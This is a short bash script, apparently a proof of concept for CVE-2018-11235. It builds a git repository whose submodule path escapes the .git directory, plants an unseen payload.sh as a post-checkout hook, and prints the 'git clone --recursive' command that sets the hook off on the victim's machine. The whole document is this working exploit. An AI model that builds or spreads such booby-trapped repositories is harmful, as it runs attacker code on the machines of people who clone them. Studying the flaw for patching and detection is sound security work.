#!/bin/bash

set -e

# create a folder
folder="CVE-2018-11235-PoC"
mkdir CVE-2018-11235-PoC
cp payload.sh "$folder/"
cd "$folder"

# create a submodule
repo_sub="Submodule"
git init "$repo_sub"
cd "$repo_sub"
touch hgt_blank
git add hgt_blank
git commit -m "submodule"
cd ..

# create and init a repo
repo="$PWD/$folder"
git init "$repo"
cd "$repo"

# add the submodule to repo
repo_submodule="./../$repo_sub"
git submodule add "$repo_submodule" payload

# construct the eval project
mkdir -p modules/1/2/3/4
cp -r .git/modules/payload modules/1/2/3/4
cd modules
ln -s 1/2/3/4/payload payload
cd ..
cp ../payload.sh modules/payload/hooks/post-checkout
git add modules
git config -f .gitmodules --rename-section submodule.payload submodule.../../modules/payload
git submodule add "$repo_submodule"
git commit -m "CVE-2018-11235"

# ued the following command to recur the vulnerability
echo "git clone --recursive \"$repo\" des_dir"
